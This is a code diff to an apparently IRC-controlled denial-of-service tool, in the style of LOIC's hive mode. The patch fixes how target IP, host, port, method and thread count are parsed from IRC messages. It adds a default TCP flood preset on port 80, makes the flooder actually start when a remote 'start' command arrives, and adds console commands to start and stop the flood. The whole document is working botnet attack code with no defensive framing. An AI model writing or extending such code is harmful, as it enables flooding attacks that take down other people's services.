@@ -28,6 +28,7 @@ speed = None
 
 
 def lazerParseHook(event):
+    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
     print event.arg
 
     s = []
@@ -37,8 +38,18 @@ def lazerParseHook(event):
             for y in t:
                 s.append(y)
         else:
-            if t[0] == "start" and status == WAITING:
+            if t[0] == "start":
                 status = START
+            elif t[0] == "default": #needs to be fleshed out more
+                timeout = 9001
+                subsite = "/"
+                port = 80
+                message = "U dun goofed"
+                method = TCP_METHOD
+                speed = 0
+                random = False
+
+    print "Splitting finished, status:", status
 
     for x in range(0, len(s), 2):
         if s[x] == "targetip":
@@ -96,16 +107,22 @@ def lazerParseHook(event):
                 elif speed < 1:
                     speed = 1
 
-        if status == START:
-            event = Event(START_LAZER, None)
-            getEventManager().signalEvent(event)
-        else:
-            status = WAITING
+    print "parsing finished"
+
+    if status == START:
+        event = Event(START_LAZER, None)
+        getEventManager().signalEvent(event)
+    else:
+        status = WAITING
 
 def lazerStartHook(event):
+    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
     print "FIRING MAH LAZ000000R!"
     if status == START:
-        if targetip == None or targethost == None or port == None:
+        if flooder != None:
+            flooder.stop()
+
+        if (targetip == None and targethost == None) or port == None:
             print "no target set"
             return
 
@@ -126,6 +143,7 @@ def lazerStartHook(event):
             host = targethost
 
         flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait)
+        flooder.start()
 
 irc = None
 def restartIRCHook(event):
@@ -136,7 +154,7 @@ def restartIRCHook(event):
     irc.connect()
 
 def main(args):
-    global irc
+    global irc, flooder
 
     listener = Listener(LAZER_RECV, lazerParseHook)
     getEventManager().addListener(listener)
@@ -157,8 +175,16 @@ def main(args):
 
     while 1:
         i = raw_input()
-        if i == "quit" or i == "exit":
+        if i == "stopflood":
+            if flooder:
+                flooder.stop()
+        elif i == "startflood":
+            if flooder:
+                flooder.start()
+        elif i == "quit" or i == "exit":
             irc.stop()
+            if flooder:
+                flooder.stop()
             getEventManager().stop()
             break
 
